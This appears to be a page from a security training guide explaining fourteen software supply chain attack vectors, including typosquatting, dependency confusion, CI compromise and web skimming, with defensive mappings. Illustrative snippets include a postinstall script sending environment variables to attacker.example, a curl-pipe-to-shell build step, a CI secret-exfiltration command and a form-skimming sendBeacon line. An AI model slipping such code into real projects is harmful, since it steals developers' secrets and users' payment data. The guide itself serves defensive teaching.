# Software Supply Chain Failures - Attack Vectors

## Table of Contents
- [The Core Attack Flow](#the-core-attack-flow)
- [Attack Patterns](#attack-patterns)
- [The Attacker's Perspective](#the-attackers-perspective)

## The Core Attack Flow

Every supply chain attack follows the same underlying logic: **compromise something upstream that the victim already trusts, so the malicious code is delivered through a channel the victim will not question.** The attacker does not need to breach your perimeter—they let your own build and update mechanisms carry the payload in for them.

```
1. FIND a trusted upstream       (a dependency, maintainer, build step,
                                  registry, base image, or third-party script)
2. COMPROMISE it                 (typosquat, hijack an account, poison a runner,
                                  inject a build step, take over a CDN)
3. PUBLISH the malicious version (validly named, often validly signed)
4. WAIT for pull / auto-update   (npm install, pip install, docker pull,
                                  CI build, browser page load)
5. EXECUTE downstream            (install hook, build step, runtime script)
6. ACT ON OBJECTIVE              (steal secrets/cards, backdoor, persist,
                                  move laterally)
```

The patterns below are concrete instances of that flow, grouped roughly from the dependency tier, through the build/distribution tier, to the runtime tier.

## Attack Patterns

### 1. Exploiting Known-Vulnerable / Outdated Dependencies

The classic A06:2021 case: the attacker does not tamper with anything—they simply scan for applications still running a component with a published vulnerability and exploit it. Version banners, error pages, and public SBOMs make target selection easy.

```
# Attacker fingerprints a known-vulnerable version, then fires a public exploit
$ curl -s https://target.example/ | grep -i 'x-powered-by\|version'
X-Powered-By: OldFramework/1.2.3        # <-- matches a public CVE
$ ./exploit-cve-XXXX.py --target https://target.example/
```

**Why it works**: patch cadence lags disclosure; transitive dependencies are invisible without an inventory.

### 2. Typosquatting

The attacker publishes a malicious package whose name closely resembles a popular one, betting on developer typos or copy-paste errors.

```
# Legitimate                Malicious look-alikes published to the registry
requests                    reqeusts   /  request   /  requestss
python-dateutil             python-dateutils
crossenv (intended: cross-env)          # transposed / hyphen tricks
```

```
# A single typo installs the attacker's package, which runs on install
$ pip install requsets
# setup.py of the malicious package executes arbitrary code during install
```

**Why it works**: registries permit near-identical names; install steps run code by design.

### 3. Dependency Confusion (Namespace Shadowing)

The attacker publishes a package to the *public* registry using the *same name* as one of your *internal* packages, with a higher version number. If your tooling consults the public registry alongside your private one, "highest version wins" resolution pulls the attacker's copy into internal builds.

```
# Internal package (private registry only):  @acme/auth-client @ 2.4.1
# Attacker publishes to the PUBLIC registry:  @acme/auth-client @ 99.0.0
#
# A build configured to fall back to the public registry resolves 99.0.0
# --> attacker code runs inside CI with access to internal secrets
```

**Why it works**: default resolution prefers the highest version regardless of source; internal names are guessable or leak in error messages and lockfiles.

### 4. Malicious Install / Lifecycle Hooks

Package managers run scripts at install time. A malicious package uses these hooks to execute the moment it is installed—on a developer laptop or a CI runner—before any of its code is ever imported.

```json
// package.json of a malicious dependency
{
  "name": "innocent-looking-lib",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node ./steal.js"   // runs automatically on `npm install`
  }
}
```

```js
// steal.js -- exfiltrates environment variables (tokens, cloud keys)
const os = require('os');
const https = require('https');
const loot = JSON.stringify({ env: process.env, host: os.hostname() });
https.request('https://attacker.example/collect',
  { method: 'POST' }).end(loot);
```

**Why it works**: install hooks are enabled by default and run with the developer's or CI's privileges.

### 5. Compromised Maintainer Account / Hijacked Package

Instead of creating a new malicious package, the attacker seizes an existing trusted one—via credential stuffing, a phished one-time code, or a maintainer's expired email domain that they re-register—then ships a malicious release under a name millions already depend on.

```
Timeline of a hijack:
  t0  Attacker phishes / reuses leaked creds for a maintainer account
  t1  (Optional) resets 2FA via a re-registered expired email domain
  t2  Publishes v1.9.11 with an added obfuscated dependency
  t3  Auto-updating consumers (^1.9.0) pull the malicious version within hours
  t4  Payload steals credentials / installs a miner across thousands of hosts
```

**Why it works**: caret/tilde ranges auto-adopt new releases; publisher 2FA is not universally enforced.

### 6. Transitive Dependency Poisoning

The attacker targets an obscure, deep dependency that popular packages rely on. Consumers who carefully vetted their direct dependencies never examined the compromised leaf.

```
your-app          (audited)
└── popular-lib   (audited, trusted)
    └── helper    (not audited)
        └── left-pad-ish-leaf   <-- attacker hijacks THIS
            # malicious code now runs in every app that uses popular-lib
```

**Why it works**: depth hides the payload; one leaf fans out to enormous downstream reach.

### 7. Build System / CI/CD Pipeline Compromise

Rather than the code, the attacker compromises the *factory*. A malicious or altered build step injects the payload during compilation—after code review, before signing—so the output is malicious yet validly signed. This is the SolarWinds class.

```yaml
# A malicious step slipped into the pipeline (or into a compromised runner)
build:
  script:
    - make build
    - curl -s https://attacker.example/implant.sh | sh   # injects backdoor
    - sign-and-publish   # backdoored artifact is signed as authentic
```

**Why it works**: the build environment is often less monitored than production, yet it produces the trusted artifact.

### 8. Leaked Pipeline Secrets / Poisoned Runners

CI runners hold cloud keys, registry tokens, and signing material in environment variables. Any code that runs in the pipeline—a dependency's install hook, a third-party action, a compromised uploader—can read and exfiltrate them. Self-hosted runners reused across jobs can be poisoned to persist between builds.

```
# Anything running in CI can read the secrets the job was granted
- run: |
    echo "$AWS_SECRET_ACCESS_KEY $NPM_TOKEN $SIGNING_KEY" \
      | curl -s -X POST --data-binary @- https://attacker.example/x
# Secrets printed to logs are also harvested from public build output
```

**Why it works**: broad, long-lived secrets are handed to every step; logs are often world-readable.

### 9. Unsigned / Unverified Artifacts and Missing Provenance

If an artifact is distributed without a signature or provenance attestation, an attacker who can intercept or write to the distribution path can simply swap it for a malicious one. Consumers have no cryptographic way to notice.

```
# No integrity check -> a man-in-the-middle or compromised mirror swaps the file
$ curl -O http://downloads.example/tool.tar.gz     # plain HTTP, no checksum
$ tar xzf tool.tar.gz && ./install.sh              # runs whatever arrived
```

**Why it works**: without signatures/provenance, "it downloaded fine" is the only check performed.

### 10. Poisoned Container Base Images

Images built `FROM` a mutable tag inherit whatever that tag points to today. An attacker who compromises a base image—or a look-alike published under a confusing name—lands code in every downstream image, running as whatever user the container uses.

```dockerfile
# Mutable tag: the contents can change between builds without warning
FROM node:latest          # today != tomorrow; no digest pinning
# A compromised or malicious base layer executes in every child image
```

**Why it works**: `latest` and floating tags are mutable; base layers run with the image's privileges.

### 11. Compromised Third-Party Scripts / CDNs (Web-Skimming)

On the web tier, pages load scripts directly from third-party origins (analytics, tag managers, payment and chat widgets). If that origin is compromised, the injected code runs inside your page with full access to the DOM—this is the Magecart pattern that harvests payment cards at checkout.

```html
<!-- No integrity check: whatever this URL returns today executes in your page -->
<script src="https://cdn.thirdparty.example/widget.js"></script>

// If the CDN is compromised, injected skimmer code reads the checkout form:
document.querySelectorAll('input').forEach(i =>
  navigator.sendBeacon('https://attacker.example/s', i.name + '=' + i.value));
```

**Why it works**: cross-origin scripts run with the page's privileges; without SRI, silent content changes are undetectable.

### 12. Insecure Package Registries and Name Reuse

Registries that allow unauthenticated publishing, name reuse after a package is deleted, or weak account recovery let attackers claim trusted names. A deleted package name that a lockfile still references can be re-registered by an attacker and served to old builds.

```
# A dependency is unpublished/deleted; its NAME becomes claimable again.
# Attacker re-registers the same name and version -> old builds fetch malware.
resolved "https://registry.example/left-utils/-/left-utils-1.0.0.tgz"
#          ^ name freed and re-registered by attacker
```

**Why it works**: name ownership is not always permanent; recovery flows can be abused.

### 13. Malicious Insider / Protestware

A maintainer—original or newly handed the keys—deliberately introduces sabotage or a narrowly targeted payload, sometimes triggered only for specific downstream victims or geographies (the event-stream class). Obfuscation keeps it out of casual review.

```js
// Obfuscated payload that only activates for a specific downstream target
if (process.env.npm_package_name === 'specific-victim-app') {
  require('./decode')(PAYLOAD);   // targeted, so most users never trigger it
}
```

**Why it works**: trust is transitive to whoever currently holds maintainer rights; targeting evades broad detection.

### 14. Long-Game Social-Engineering Backdoor

The most patient variant (the xz-utils class): an attacker contributes helpfully to a low-profile but critical project for months, earns maintainer trust, then plants a backdoor hidden in *release artifacts* and build scripts rather than the readable source—so the git repository looks clean while shipped tarballs are backdoored.

```
# The backdoor lives in the packaged tarball / build machinery, not the repo:
#   git source     -> looks clean under review
#   release tarball -> contains extra obfuscated build step that injects code
# Reproducible builds would reveal the mismatch between source and artifact.
```

**Why it works**: reviewers trust long-term maintainers and read source, not release artifacts.

## The Attacker's Perspective

Supply chain attacks are attractive because they invert the economics of intrusion. Instead of breaching thousands of hardened targets one by one, the attacker breaches *one* soft upstream and inherits all of its downstream trust for free.

| Attacker goal | Preferred vector | What defeats it |
|---------------|------------------|-----------------|
| Broadest reach, least effort | Hijack a popular package / poison a base image | Pinning to hashes/digests, publisher 2FA, provenance |
| Enter internal builds | Dependency confusion | Private-registry precedence, scoped names, allowlists |
| Steal build/cloud secrets | Malicious install hook / CI step | Least-privilege ephemeral creds, hardened runners |
| Sign malware as authentic | Build-system compromise | SLSA provenance, reproducible builds, isolated runners |
| Harvest live user data | Compromised third-party script | SRI + strict CSP, minimize third-party scripts |
| Evade review | Backdoor in release artifact, not source | Reproducible builds, artifact scanning, signed provenance |

## Next Steps

- **[Prevention](prevention.html)**: Layered defenses that close each of these vectors.
- **[Examples](examples.html)**: Vulnerable vs. secure configurations you can copy.
- **[Overview](overview.html)**: Concepts, impact, and how this expands A06:2021.
- **[Hands-On Lab](./lab/software-supply-chain-failures/)**: Practice detecting and exploiting these patterns safely, then fixing them.
